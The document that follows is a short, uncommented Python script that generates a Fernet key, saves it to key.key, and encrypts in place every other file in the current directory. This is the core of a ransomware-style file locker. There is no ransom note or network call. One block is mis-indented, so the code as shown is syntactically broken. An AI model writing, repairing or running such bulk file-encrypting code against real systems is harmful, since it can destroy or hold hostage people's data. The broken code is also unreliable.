import os
from cryptography.fernet import Fernet

def encrypt():
    key = Fernet.generate_key()
    cipher =Fernet(key)

    with open("key.key", "wb") as f:
        f.write(key)

    cwd = os.getcwd()

    files = []

    items = os.listdir(cwd)
    for file in items:
        if os.path.isfile(file) and file != "key.key":
            files.append(file)

    for item in files:
        with open(item, "rb") as i:
            oldContent = i.read()
        try:
            with open(item, "wb") as e:
            newContent = cipher.encrypt(oldContent)
            e.write(newContent)
        except Exception:
            continue

if __name__ == "__main__":
    encrypt()
